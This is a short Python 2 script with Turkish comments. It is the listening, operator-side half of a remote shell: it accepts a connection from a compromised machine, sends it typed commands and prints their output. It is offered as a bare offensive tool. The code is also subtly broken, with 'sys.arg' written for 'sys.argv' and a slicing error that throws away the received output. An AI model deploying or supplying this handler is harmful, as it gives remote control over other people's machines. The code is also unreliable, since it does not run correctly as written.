import socket
import subprocess as sp
import sys

host = sys.arg[1]
port = int(sys.arg[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind((host, port))
sock.listen(100) # Max baglanti sayisi 100
conn, addr = sock.accept() # istemciden gelen baglantiyi kabul eder

print "[*] %s ile baglantı kuruldu" % (str(addr[0]))

while True:
   command = raw_input("#> ")

   if command != "exit()":
      if command == "": continue

      conn.send(command)
      result = conn.recv(1024)

      total_size = long(result[:16])
      result = result[:16]

      # eger sata buyuk ise tamamini almak icin
      while total_size > len(result):
         data = conn.recv(1024)
         result += data

      print result.rstrip("\n")

   else:
      conn.send("exit()")
      print "[*] Shell sonlandiriliyor.."
      break

sock.close()
